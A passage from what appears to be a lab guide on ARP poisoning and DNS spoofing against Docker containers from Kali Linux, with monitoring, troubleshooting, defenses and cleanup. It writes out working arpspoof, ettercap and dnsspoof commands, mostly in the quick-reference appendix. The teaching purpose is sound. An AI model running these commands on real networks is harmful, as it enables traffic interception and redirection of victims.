sudo tshark -i eth0 -f "port 53 or port 80" -T fields -e frame.time -e ip.src -e ip.dst -e _ws.col.Protocol -e _ws.col.Info
```

<div class="step-animation">
<strong>Step 2:</strong> Wireshark Analysis Filters
</div>

Useful Wireshark filters for analyzing the attack:

<div class="interactive-demo">
<h4>Wireshark Filter Examples</h4>
<div class="code-highlight">
<strong>DNS Traffic:</strong> <code>dns && ip.addr == 192.168.1.30</code><br/>
<strong>ARP Poisoning:</strong> <code>arp && arp.opcode == 2</code><br/>
<strong>HTTP Redirection:</strong> <code>http && ip.addr == 192.168.1.30</code><br/>
<strong>Spoofed Responses:</strong> <code>dns.flags.response == 1 && dns.a == 192.168.1.100</code>
</div>
</div>

#### 3.4 Container-level Verification (If Docker Access Available)

<div class="step-animation">
<strong>Step 1:</strong> Verify Attack from Container Perspective
</div>

```bash
# If Kali has Docker access, verify from victim container
# Check victim's ARP table
docker exec src_http_requester_1 arp -a

# Check victim's DNS resolution
docker exec src_http_requester_1 nslookup goodserver.com

# Monitor victim's HTTP requests
docker exec src_http_requester_1 netstat -tn

# Check which server is responding
docker logs --tail=10 src_web_server_1     # Should show no new traffic
docker logs --tail=10 src_evil_web_server_1 # Should show redirected traffic
```

#### 3.5 Attack Effectiveness Metrics

<div class="network-diagram">
<h4>Successful Kali Linux DNS Spoofing Verification</h4>
<div class="device client">Victim Container<br/>192.168.1.30</div>
<span class="arrow attack">→</span>
<div class="device attacker">Kali Linux<br/>192.168.1.20<br/>Intercepting</div>
<span class="arrow attack">→</span>
<div class="device server">Spoofed DNS<br/>Response</div>
<br/><br/>
<div class="packet spoofed">HTTP Request to goodserver.com</div>
<span class="arrow attack">→</span>
<div class="device attacker">Evil Container<br/>192.168.1.100</div>
<span class="arrow">→</span>
<div class="device attacker">Kali Monitoring</div>
<br/><br/>
<div class="device client">Victim receives evil content</div>
<span class="arrow attack">→</span>
<div class="device attacker">Attack confirmed successful</div>
</div>

**Attack Effectiveness Assessment:**
This diagram shows the complete verification of a successful DNS spoofing attack from Kali Linux:

**First row** (Traffic Interception):
- **Victim Container**: Makes requests believing they're going to legitimate services
- **Kali Linux**: Successfully intercepting and redirecting all DNS queries
- **Spoofed DNS Response**: Kali provides malicious DNS responses

**Second row** (Traffic Redirection):
- **HTTP Request**: Victim makes HTTP request to what it thinks is goodserver.com
- **Evil Container**: Receives redirected traffic from the victim
- **Kali Monitoring**: Full visibility and control over the attack flow

**Third row** (Attack Confirmation):
- **Victim**: Unknowingly receives malicious content from evil server
- **Attack Success**: Kali Linux successfully manipulates container communications

The key success indicators are complete traffic interception, DNS redirection, and evil server responses.

#### 3.6 Common Issues and Solutions (Kali Linux Environment)

<div class="step-animation warning">
<strong>Issue 1:</strong> ARP poisoning not working
<br/><strong>Solution:</strong> <code>sudo sysctl net.ipv4.ip_forward=1</code> and verify network interface
<br/><strong>Explanation:</strong> IP forwarding must be enabled on Kali Linux to maintain connectivity while performing MITM attacks. Also ensure you're using the correct network interface (eth0, wlan0, etc.).
</div>

<div class="step-animation warning">
<strong>Issue 2:</strong> DNS spoofing not taking effect
<br/><strong>Solution:</strong> Clear victim's DNS cache and verify ettercap configuration
<br/><strong>Explanation:</strong> Container DNS caches may persist. Use <code>docker exec container_name ip route flush cache</code> or restart the victim container. Check <code>/etc/ettercap/etter.dns</code> syntax.
</div>

<div class="step-animation warning">
<strong>Issue 3:</strong> Cannot reach containers from Kali Linux
<br/><strong>Solution:</strong> Verify macvlan network configuration and routing
<br/><strong>Explanation:</strong> The macvlan Docker network must be accessible from Kali Linux. Check with <code>ip route</code> and ensure the 192.168.1.0/24 network is reachable.
</div>

<div class="step-animation warning">
<strong>Issue 4:</strong> Ettercap privilege errors
<br/><strong>Solution:</strong> Run with <code>sudo</code> and check ettercap configuration
<br/><strong>Explanation:</strong> Network attacks require root privileges. Edit <code>/etc/ettercap/etter.conf</code> to set ec_uid = 0 and ec_gid = 0 if needed.
</div>

<div class="step-animation warning">
<strong>Issue 5:</strong> Traffic not being intercepted
<br/><strong>Solution:</strong> Verify ARP tables and use promiscuous mode
<br/><strong>Explanation:</strong> Check victim's ARP table with <code>arp -a</code>. Enable promiscuous mode: <code>sudo ip link set eth0 promisc on</code>
</div>

### 4. Advanced Analysis and Learning Objectives

#### 4.1 Understanding Real-world Attack Vectors

<div class="interactive-demo">
<h4>Kali Linux DNS Spoofing Attack Vectors</h4>
<div class="code-highlight">
<strong>Vector 1:</strong> Network-based ARP poisoning + DNS interception<br/>
<strong>Vector 2:</strong> Rogue DNS server with traffic redirection<br/>
<strong>Vector 3:</strong> Container network manipulation<br/>
<strong>Impact:</strong> Complete control over victim's DNS resolution
</div>
</div>

**Real-world Attack Vector Analysis:**
This lab demonstrates practical DNS spoofing techniques that mirror real-world scenarios:

1. **Network-based Attacks**: Using ARP poisoning to position Kali Linux as a man-in-the-middle, intercepting DNS queries before they reach legitimate servers.

2. **Rogue Infrastructure**: Setting up malicious DNS servers that respond with false information, simulating compromised network infrastructure.

3. **Container Security**: Demonstrating how containerized applications are vulnerable to network-level attacks, even when using isolated Docker networks.

#### 4.2 Kali Linux Attack Methodology

<div class="step-animation">
<strong>Learning Objective 1:</strong> Master Network Attack Tools
</div>

Key skills developed through this lab:
- **ettercap**: Advanced man-in-the-middle attack framework
- **arpspoof**: Targeted ARP poisoning for traffic redirection  
- **dnsspoof**: DNS response manipulation and interception
- **tcpdump/Wireshark**: Network traffic analysis and monitoring
- **nmap**: Network reconnaissance and service discovery

<div class="step-animation">
<strong>Learning Objective 2:</strong> Container Network Security
</div>

Understanding container vulnerabilities:
- **macvlan networks**: How Docker bridges expose containers to network attacks
- **DNS dependencies**: Container reliance on external DNS services
- **Network isolation**: Limitations of container network security
- **Attack surface**: How external attackers can manipulate container communications

#### 4.3 Defense Against Kali Linux-based Attacks

<div class="interactive-demo">
<h4>Defensive Measures Against Network Attacks</h4>
<div class="code-highlight">
<strong>Network Level:</strong> Static ARP entries, port security, network segmentation<br/>
<strong>DNS Level:</strong> DNSSEC, DNS over HTTPS/TLS, multiple DNS providers<br/>
<strong>Container Level:</strong> Network policies, DNS filtering, monitoring<br/>
<strong>Detection:</strong> ARP monitoring, DNS query analysis, traffic inspection
</div>
</div>

**Defense Strategy Explanation:**
- **Static ARP entries**: Prevent ARP poisoning by manually configuring MAC-IP mappings
- **Network segmentation**: Isolate critical services using VLANs or separate networks  
- **DNS security**: Implement DNSSEC, DoH, or DoT to prevent DNS manipulation
- **Container policies**: Use Kubernetes network policies or Docker security features
- **Monitoring systems**: Deploy intrusion detection systems that alert on ARP anomalies

### 5. Laboratory Cleanup and Reset

#### 5.1 Stop Attack and Restore Normal Operation

<div class="timeline">
<div class="timeline-item">
<strong>Step 1:</strong> Stop all Kali Linux attack tools
</div>
<div class="timeline-item">
<strong>Step 2:</strong> Clear ARP poisoning from network
</div>
<div class="timeline-item">
<strong>Step 3:</strong> Verify normal container communications
</div>
<div class="timeline-item">
<strong>Step 4:</strong> Document attack findings and cleanup
</div>
</div>

**Cleanup Process Explanation:**
This process ensures the network returns to normal operation and all attack traces are removed.

<div class="step-animation">
<strong>Step 1:</strong> Stop Attack Tools on Kali Linux
</div>

```bash
# Stop ettercap (Ctrl+C or kill process)
sudo pkill ettercap

# Stop arpspoof processes
sudo pkill arpspoof

# Stop dnsspoof
sudo pkill dnsspoof

# Stop any rogue DNS server
sudo systemctl stop dnsmasq

# Restore normal ettercap DNS configuration
sudo cp /etc/ettercap/etter.dns.backup /etc/ettercap/etter.dns 2>/dev/null || true
```

<div class="step-animation">
<strong>Step 2:</strong> Clear Network Poisoning
</div>

```bash
# Clear ARP cache on Kali Linux
sudo ip -s -s neigh flush all

# Send gratuitous ARP to restore correct mappings
sudo arping -c 5 -I eth0 192.168.1.4
sudo arping -c 5 -I eth0 192.168.1.30

# Disable IP forwarding if no longer needed
sudo sysctl net.ipv4.ip_forward=0

# Restore normal network interface settings
sudo ip link set eth0 promisc off
```

<div class="step-animation">
<strong>Step 3:</strong> Verify Normal Container Operation
</div>

```bash
# Test DNS resolution is restored
nslookup goodserver.com 192.168.1.4

# Should return 192.168.1.10 (legitimate server)

# Monitor container traffic to ensure normal operation
sudo tcpdump -i eth0 -n -c 10 port 80 and host 192.168.1.30

# Verify containers are communicating normally
# docker logs --tail=20 src_http_requester_1  # (if Docker access available)
```

<div class="step-animation">
<strong>Step 4:</strong> Final Verification and Documentation
</div>

```bash
# Verify no attack tools are running
ps aux | grep -E "(ettercap|arpspoof|dnsspoof)"

# Check network is clean
sudo arp -a | grep "192.168.1"

# Test legitimate server is receiving traffic again
curl -s http://192.168.1.10 | jq  # Should respond normally

# Document attack timeline and cleanup
echo "Attack completed at $(date)" >> /tmp/lab_log.txt
echo "Cleanup completed at $(date)" >> /tmp/lab_log.txt
```

## References and Additional Resources

### Docker and Container Security
- [Docker Network Security Best Practices](https://docs.docker.com/network/security/)
- [Container Network Security](https://kubernetes.io/docs/concepts/policy/pod-security-policy/)
- [Macvlan Network Driver Documentation](https://docs.docker.com/network/macvlan/)

### DNS Security and DNSSEC
- [OWASP DNS Spoofing](https://owasp.org/www-community/attacks/DNS_Spoofing)
- [RFC 4033 - DNS Security](https://tools.ietf.org/html/rfc4033)
- [DNS over HTTPS (DoH) RFC 8484](https://tools.ietf.org/html/rfc8484)
- [DNS over TLS (DoT) RFC 7858](https://tools.ietf.org/html/rfc7858)

### Network Security Tools and Techniques
- [dnsmasq Documentation](http://www.thekelleys.org.uk/dnsmasq/doc.html)
- [Ettercap Documentation](https://ettercap.github.io/ettercap/)
- [Wireshark User Guide](https://www.wireshark.org/docs/wsug_html_chunked/)
- [ARP Protocol RFC 826](https://tools.ietf.org/html/rfc826)

### Laboratory Environment Extensions
- [Docker Compose Networking](https://docs.docker.com/compose/networking/)
- [FastAPI Documentation](https://fastapi.tiangolo.com/)
- [curl Advanced Usage](https://curl.se/docs/manpage.html)

### Real-world Case Studies
- [DNS Hijacking Incidents and Response](https://www.cisa.gov/news-events/alerts/2019/01/24/dns-infrastructure-hijacking-campaign)
- [BGP and DNS Security](https://www.nist.gov/publications/bgp-and-dns-security)

---

## Appendix: Quick Reference Commands

### Laboratory Startup (Docker Host)
```bash
# Navigate to laboratory directory
cd TFM-Labos/src

# Start the complete environment
docker-compose up -d

# Verify all services are running
docker-compose ps
```

### Kali Linux Attack Commands
```bash
# Enable IP forwarding for MITM attacks
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# ARP poisoning with arpspoof
sudo arpspoof -i eth0 -t 192.168.1.30 192.168.1.4 &
sudo arpspoof -i eth0 -t 192.168.1.4 192.168.1.30 &

# ARP poisoning with ettercap (alternative)
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.30// /192.168.1.4//

# DNS spoofing with ettercap
echo "goodserver.com A 192.168.1.100" | sudo tee -a /etc/ettercap/etter.dns
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.30// /192.168.1.4// -P dns_spoof

# DNS spoofing with dnsspoof
echo "192.168.1.100 goodserver.com" | sudo tee /tmp/dns_hosts
sudo dnsspoof -i eth0 -f /tmp/dns_hosts host 192.168.1.30
```

### Monitoring Commands (Kali Linux)
```bash
# Monitor DNS traffic
sudo tcpdump -i eth0 -n -s 0 port 53

# Monitor HTTP redirection
sudo tcpdump -i eth0 -n port 80 and host 192.168.1.30

# Monitor ARP poisoning
sudo tcpdump -i eth0 -n arp

# Check ARP tables
sudo arp -a | grep "192.168.1"

# Network reconnaissance
nmap -sn 192.168.1.0/24
nmap -sV 192.168.1.4,192.168.1.10,192.168.1.30,192.168.1.100
```

### Verification Commands
```bash
# Test DNS resolution from Kali
nslookup goodserver.com 192.168.1.4
dig @192.168.1.4 goodserver.com

# Test HTTP responses
curl -s http://192.168.1.10 | jq   # Legitimate server
curl -s http://192.168.1.100 | jq  # Evil server

# Wireshark capture
sudo wireshark &
sudo tshark -i eth0 -f "net 192.168.1.0/24" -w /tmp/attack_capture.pcap
```

### Cleanup Commands (Kali Linux)
```bash
# Stop attack tools
sudo pkill ettercap
sudo pkill arpspoof
sudo pkill dnsspoof

# Clear ARP cache
sudo ip -s -s neigh flush all

# Restore network settings
sudo sysctl net.ipv4.ip_forward=0
sudo ip link set eth0 promisc off

# Send gratuitous ARP to restore mappings
sudo arping -c 5 -I eth0 192.168.1.4
sudo arping -c 5 -I eth0 192.168.1.30
```

### Environment IP Reference
```
Kali Linux:        192.168.1.20  (Physical attack machine)
DNS Server:        192.168.1.4   (dnsmasq container)
Good Web Server:   192.168.1.10  (goodserver.com container)
Evil Web Server:   192.168.1.100 (attack target container)
Victim Client:     192.168.1.30  (requester container)
Network Gateway:   192.168.1.1   (Physical router)
```

### Attack Flow Summary
```
1. Start Docker environment on host
2. Configure Kali Linux network tools
3. Perform network reconnaissance
4. Execute ARP poisoning
5. Implement DNS spoofing
6. Monitor attack success
7. Clean up and restore normal operation
```